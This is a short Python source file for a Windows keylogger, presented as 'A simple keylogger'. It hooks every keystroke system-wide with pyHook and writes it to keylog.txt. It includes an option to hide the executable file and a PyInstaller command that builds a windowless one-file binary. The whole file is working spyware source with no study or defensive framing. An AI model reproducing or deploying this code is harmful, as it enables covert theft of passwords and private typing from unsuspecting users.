# coding=utf-8

"""
pyinstaller --onefile --hidden-import=pyHook --hidden-import=pythoncom --hidden-import=os --hidden-import=win32con --hidden-import=win32api --hidden-import=argparse --hidden-import=logging --hidden-import=win32gui -w keylogger.py
"""

import pyHook,pythoncom,win32api,win32con,win32gui,argparse,logging,os
 
parser = argparse.ArgumentParser(description='A simple keylogger')
parser.add_argument("-i", "--hidden", help="Hidden script",action="store_true")
args = parser.parse_args()

if args.hidden:
    self_path = os.path.abspath("keylogger.exe")
    try:
        win32api.SetFileAttributes("keylogger.exe",win32con.FILE_ATTRIBUTE_HIDDEN)
    except Exception as e:
        logging.exception("HIDE EXCEPTION")

LOG_FILENAME = "keylog.txt"   
f=open(LOG_FILENAME,'w')

def OnKeyboardEvent(event):
    if event.Ascii == 5: #CTRL-E
        _exit(1)       
    if event.Ascii != 0 or 8:
        f=open('keylog.txt','r')
        buffer = f.read() 
        f.close()         
        f=open('keylog.txt','w')
        keylogs = chr(event.Ascii)
        if event.Ascii == 13:
            keylogs = '\n'
        buffer += keylogs 
        f.write(buffer)
        f.close()
       
hook = pyHook.HookManager() 
hook.KeyDown = OnKeyboardEvent 
hook.HookKeyboard() 
pythoncom.PumpMessages()